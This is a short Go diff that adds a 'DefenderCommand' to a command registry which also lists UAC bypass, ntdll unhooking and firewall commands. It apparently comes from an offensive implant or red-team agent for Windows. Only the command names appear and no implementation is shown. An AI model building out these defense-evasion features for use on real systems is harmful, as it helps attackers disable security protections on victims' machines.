@@ -46,4 +46,5 @@ func registerPlatformCommands() {
 	RegisterCommand(&UACBypassCommand{})
 	RegisterCommand(&NtdllUnhookCommand{})
 	RegisterCommand(&FirewallCommand{})
+	RegisterCommand(&DefenderCommand{})
 }
